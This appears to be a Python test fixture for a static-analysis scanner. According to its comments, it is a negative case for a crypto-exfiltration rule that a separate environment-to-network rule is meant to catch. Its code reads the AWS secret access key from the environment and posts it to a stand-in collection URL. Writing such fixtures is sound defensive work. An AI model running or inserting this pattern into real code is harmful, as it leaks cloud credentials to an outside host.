# Fixture: crypto_exfil NEGATIVE — plain credential->network exfil, NO encryption.
# Caught by pyast_env_to_network_write, NOT by crypto_exfil (no crypto leg).
import os
import requests

secret = os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://example.com/collect", data={"s": secret})
